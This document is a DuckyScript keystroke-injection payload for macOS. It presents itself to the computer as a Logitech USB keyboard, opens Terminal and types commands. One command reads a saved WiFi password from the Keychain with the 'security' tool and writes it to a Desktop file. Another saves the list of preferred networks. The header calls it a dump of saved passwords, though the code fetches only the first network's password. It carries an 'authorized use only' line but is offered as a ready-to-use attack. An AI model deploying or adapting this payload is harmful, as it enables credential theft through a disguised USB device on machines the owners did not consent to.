REM Title: macOS WiFi Password Dump
REM Author: Community
REM Target: macOS (10.14+)
REM Description: Dumps saved WiFi passwords to Desktop
REM Requires user password for Keychain access
REM AUTHORIZED USE ONLY
REM
ID 046D:C31C Logitech USB Keyboard

DELAY 1500

COMMAND SPACE
DELAY 600
STRING terminal
ENTER
DELAY 1200

STRING security find-generic-password -wa "$(networksetup -listpreferredwirelessnetworks en0 | tail -n +2 | head -1 | xargs)" 2>/dev/null > ~/Desktop/wifi_pass.txt; echo "Done - check Desktop/wifi_pass.txt"
ENTER
DELAY 2000

REM Full WiFi network list
STRING networksetup -listpreferredwirelessnetworks en0 > ~/Desktop/wifi_networks.txt
ENTER
DELAY 1000
